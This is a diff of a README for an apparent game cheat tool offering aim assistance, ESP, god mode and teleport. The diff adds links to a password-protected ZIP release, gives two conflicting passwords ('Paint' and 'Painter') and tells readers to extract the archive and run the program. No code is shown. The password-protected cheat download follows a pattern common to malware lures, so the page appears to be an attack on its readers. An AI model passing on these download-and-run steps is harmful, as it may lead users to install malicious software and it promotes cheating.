@@ -6,13 +6,19 @@
 Aim Assistance · ESP · God Mode · Teleport · Speed Control · Auto Paint
 
 <img width="1649" height="776" alt="demo" src="https://github.com/user-attachments/assets/da82d11a-ec58-403b-8291-4a62b77d7259" />
+
 ---
 
 <p align="center">
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
-    <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-100000?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="400" />
+  <a href="https://github.com/falscriptor/Meccha-Chameleon-Tool/releases/download/v1.0.3/MecchaAutoPainter.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download" />
   </a>
 </p>
+
+<p align="center">
+  <b>Password: <code>Paint</code></b>
+</p>
+
 
 ## ✨ Features
 
@@ -57,8 +63,13 @@ Aim Assistance · ESP · God Mode · Teleport · Speed Control · Auto Paint
 ---
 
 ## ⚙️ Installation
+<p align="left">
+  <a href="https://github.com/falscriptor/Meccha-Chameleon-Tool/releases/download/v1.0.3/MecchaAutoPainter.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download" />
+  </a>
+</p>
 
-1. Download the latest release.
+1. Download the latest release above.
 2. Extract the archive to a folder using the password `Painter`.
 3. Run the application.
 ---
